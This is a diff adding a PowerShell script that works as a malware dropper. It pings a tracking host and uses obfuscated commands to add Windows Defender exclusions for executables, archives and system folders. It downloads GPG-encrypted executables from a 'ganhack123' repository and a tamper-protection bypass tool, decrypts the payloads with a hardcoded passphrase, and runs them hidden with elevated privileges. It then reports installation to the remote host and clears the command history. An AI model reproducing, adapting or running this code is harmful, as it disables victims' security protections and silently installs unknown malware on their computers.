@@ -1,0 +1,153 @@
+sleep -Milliseconds 1235
+$ErrorActionPreference = 'Stop'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest -Uri ("https://ads-check.com/start.php") -UseBasicParsing
+$ErrorActionPreference = 'Continue'
+
+Add-MpPrefer`ence -ExclusionExtension ".rar", ".cmd", ".bat", ".zip", ".exe"
+
+
+Add-MpPrefer`ence -ExclusionPath "C:\Windows\System32\drivers\etc", "C:\Windows\System32\Config", "$env:APPDATA"
+Add-MpPrefer`ence -ExclusionProcess "ZipCosdaz.exe", "ZipCosdaz1.exe", "Explorer.exe"
+
+
+Invoke-WebRe`quest -Uri ("https://bitbucket.org/ganhack123/load/downloads/ZipCosdaz1.exe.gpg") -OutFile $env:APPDATA\ZipCosdaz1.exe.gpg
+Invoke-WebRe`quest -Uri ("https://bitbucket.org/ganhack123/load/downloads/ZipCosdaz.exe.gpg") -OutFile $env:APPDATA\ZipCosdaz.exe.gpg
+Invoke-WebRe`quest -Uri ("https://bitbucket.org/ganhack123/load/downloads/ZLocal.gpg") -OutFile $env:APPDATA\ZLocal.exe.gpg
+
+sleep -Milliseconds 245
+Invoke-Web`Request -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $env:APPDATA\NSudo.exe
+Invoke-Web`Request -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $env:APPDATA\NSudo.exe
+Invoke-Web`Request -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $env:APPDATA\NSudo.exe
+sleep -Milliseconds 245
+Invoke-Web`Request -Uri https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-611.exe -OutFile $env:APPDATA\winrar-x64-611.exe
+.$env:APPDATA\winrar-x64-611.exe
+
+function Install-GnuPg {
+
+  [CmdletBinding()]
+
+  param
+  (
+
+    [Parameter(Mandatory)]
+    [ValidateNotNullOrEmpty()]
+    [string]$DownloadFolderPath,
+    
+    [Parameter()]
+    [ValidateNotNullOrEmpty()]
+       
+    [string]$DownloadUrl = 'http://files.gpg4win.org/gpg4win-2.2.5.exe'
+      
+    )
+
+  process {
+
+    try {
+
+      $DownloadFilePath = "$DownloadFolderPath\$($DownloadUrl | Split-Path -Leaf)"
+      if (-not (Test-Path -Path $DownloadFilePath -PathType Leaf)) {
+        Write-Verbose -Message "Downloading [$($DownloadUrl)] to [$($DownloadFilePath)]"
+        Invoke-WebRequest -Uri $DownloadUrl -OutFile $DownloadFilePath
+      } else {
+        Write-Verbose -Message "The download file [$($DownloadFilePath)] already exists"
+      }
+      Write-Verbose -Message 'Attempting to install GPG4Win...'
+      Start-Process -FilePath $DownloadFilePath -ArgumentList '/S' -NoNewWindow -Wait -PassThru
+      Write-Verbose -Message 'GPG4Win installed'
+    } catch {
+      Write-Error $_.Exception.Message
+    }
+  }
+}
+
+function Add-Encryption {
+  
+  
+  [CmdletBinding()]
+  [OutputType([System.IO.FileInfo])]
+  param
+  (
+    [Parameter(Mandatory)]
+    [ValidateNotNullOrEmpty()]
+    [ValidateScript({Test-Path -Path $_ -PathType Container})]
+    [string]$FolderPath,
+  
+    [Parameter(Mandatory)]
+    [ValidateNotNullOrEmpty()]
+    [string]$Password,
+  
+    [Parameter()]
+    [ValidateNotNullOrEmpty()]
+    [string]$GpgPath = 'C:\Program Files (x86)\GNU\GnuPG\gpg2.exe'
+    
+  )
+
+
+  process {
+    try {
+      Get-ChildItem -Path $FolderPath | foreach {
+        Write-Verbose -Message "Encrypting [$($_.FullName)]"
+        & $GpgPath --batch --passphrase $Password -c $_.FullName
+      }
+      Get-ChildItem -Path $FolderPath -Filter '*.gpg'
+    } catch {
+      Write-Error $_.Exception.Message
+    }
+  }
+}
+
+function Remove-Encryption {
+  
+  [CmdletBinding()]
+  param
+  (
+    [Parameter(Mandatory)]
+    [ValidateNotNullOrEmpty()]
+    [ValidateScript({ Test-Path -Path $_ -PathType Container })]
+    [string]$FolderPath,
+    
+    [Parameter(Mandatory)]
+    [ValidateNotNullOrEmpty()]
+    [string]$Password,
+    
+    [Parameter()]
+    [ValidateNotNullOrEmpty()]
+    [string]$GpgPath = 'C:\Program Files (x86)\GNU\GnuPG\gpg2.exe'
+  )
+  process {
+    try {
+      Get-ChildItem -Path $FolderPath -Filter '*.gpg' | foreach {
+        $decryptFilePath = $_.FullName.TrimEnd('.gpg')
+        Write-Verbose -Message "Decrypting [$($_.FullName)] to [$($decryptFilePath)]"
+        $startProcParams = @{
+          'FilePath'     = $GpgPath
+          'ArgumentList' = "--batch --yes --passphrase $Password -o $decryptFilePath -d $($_.FullName)" 
+          'Wait'         = $true
+          'NoNewWindow'  = $true
+        }
+        $null = Start-Process @startProcParams
+      }
+      Get-ChildItem -Path $FolderPath | where {$_.Extension -ne 'gpg'}
+    } catch {
+      Write-Error $_.Exception.Message
+    }
+  }
+}
+
+
+
+Write-Host $URL
+
+$env:APPDATA
+Install-GnuPG -DownloadFolderPath $env:APPDATA
+
+
+Remove-Encryption -FolderPath $env:APPDATA -Password 'putingod'
+
+
+
+.$env:APPDATA\Nsudo.exe -U:P -ShowWindowMode:Hide cmd /c powershell.exe -command "$env:APPDATA\ZipCosdaz.exe; $env:APPDATA\ZipCosdaz1.exe; $env:APPDATA\ZLocal.exe"
+Invoke-WebRe`quest -Uri ('ht'+'t'+'ps:'+'//'+'ads-check.com/install.php') -UseBasicParsing
+Clear-History 
+
